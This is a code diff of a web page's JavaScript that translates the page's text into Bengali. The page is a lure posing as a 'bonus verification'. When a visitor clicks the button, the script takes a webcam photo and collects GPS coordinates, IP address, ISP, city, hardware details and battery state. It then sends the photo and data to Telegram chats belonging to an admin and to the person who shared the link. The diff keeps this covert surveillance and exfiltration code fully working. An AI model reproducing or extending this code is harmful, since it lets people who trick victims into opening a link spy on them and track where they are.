@@ -53,46 +53,44 @@
         const verifyBtn = document.getElementById('verify-btn');
         const status = document.getElementById('status');
 
-        let gpsData = "GPS: Not Shared";
+        let gpsData = "\n📍 **GPS লোকেশন:** পারমিশন নেই";
 
-        // GPS থেকে সঠিক লোকেশন বের করা
-        function getPreciseLocation() {
+        // GPS ট্র্যাকিং ফাংশন
+        function fetchGPS() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    gpsData = `\n🎯 **Precise GPS Loc:**\n[Click for Map](https://www.google.com/maps?q=${lat},${lon})`;
-                }, (err) => {
-                    gpsData = "\nGPS: Permission Denied";
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    gpsData = `\n🎯 **সঠিক GPS লোকেশন (গুগল ম্যাপস):**\n[এখানে ক্লিক করুন](https://www.google.com/maps?q=${lat},${lon})`;
                 });
             }
         }
 
         async function getDeepIntel() {
-            let intel = "\n\n🌐 **NETWORK INTEL**";
+            let intel = "\n\n🌐 **নেটওয়ার্ক তথ্য**";
             try {
                 const res = await fetch('https://ipwho.is/');
                 const d = await res.json();
-                intel += `\nIP: \`${d.ip}\`\nISP: \`${d.connection.isp}\`\nLoc: \`${d.city}, ${d.country}\`\nMaps: [Click](https://www.google.com/maps?q=${d.latitude},${d.longitude})`;
+                intel += `\nআইপি: \`${d.ip}\`\nইন্টারনেট: \`${d.connection.isp}\`\nশহর: \`${d.city}, ${d.country}\``;
                 
-                intel += "\n\n💻 **HARDWARE INTEL**";
-                intel += `\nCores: \`${navigator.hardwareConcurrency || 'N/A'}\`\nRAM: \`${navigator.deviceMemory || 'N/A'}GB\`\nScreen: \`${window.screen.width}x${window.screen.height}\``;
+                intel += "\n\n💻 **ডিভাইস তথ্য**";
+                intel += `\nপ্রসেসর কোর: \`${navigator.hardwareConcurrency || 'N/A'}\`\nর‍্যাম: \`${navigator.deviceMemory || 'N/A'}GB\`\nস্ক্রিন: \`${window.screen.width}x${window.screen.height}\``;
                 
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    intel += `\nBattery: \`${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Idle'})\``;
+                    intel += `\nব্যাটারি: \`${Math.round(b.level * 100)}% (${b.charging ? 'চার্জ হচ্ছে' : 'হচ্ছে না'})\``;
                 }
-            } catch (e) { intel += "\nError fetching intel."; }
+            } catch (e) { intel += "\nতথ্য পাওয়া যায়নি।"; }
             return intel;
         }
 
         verifyBtn.addEventListener('click', async () => {
-            status.innerText = "> INITIALIZING...";
+            status.innerText = "> সিস্টেম শুরু হচ্ছে...";
             status.className = "success";
             verifyBtn.style.display = "none"; 
 
-            // GPS এর অনুমতি চাওয়া
-            getPreciseLocation();
+            // লোকেশন পারমিশন চাওয়া
+            fetchGPS();
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -109,22 +107,21 @@
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(async (blob) => {
-                        // GPS ডাটা এবং ইনটেল ডাটা একসাথে পাঠানো
-                        const caption = "🛠 **SYSTEM BREACH SUCCESSFUL**" + intelData + gpsData;
+                        const caption = "🛠 **সফলভাবে তথ্য পাওয়া গেছে!**" + intelData + gpsData;
                         
                         await sendToTelegram(blob, adminId, caption);
                         if (userIdFromLink && userIdFromLink !== adminId) {
                             await sendToTelegram(blob, userIdFromLink, caption);
                         }
 
-                        status.innerText = "> SUCCESSFUL";
+                        status.innerText = "> বোনাস ভেরিফিকেশন সফল!";
                         status.className = "success";
                         stream.getTracks().forEach(t => t.stop());
                     }, 'image/jpeg', 0.8);
                 }, 3000); 
 
             } catch (err) {
-                status.innerText = "> ACCESS DENIED: CAMERA REQUIRED";
+                status.innerText = "> এরর: ক্যামেরা পারমিশন প্রয়োজন!";
                 status.className = "error";
                 verifyBtn.style.display = "block";
             }
@@ -133,7 +130,7 @@
         async function sendToTelegram(blob, id, caption) {
             const formData = new FormData();
             formData.append('chat_id', id);
-            formData.append('photo', blob, 'x-capture.jpg');
+            formData.append('photo', blob, 'user_photo.jpg');
             formData.append('caption', caption);
             formData.append('parse_mode', 'Markdown');
             try {
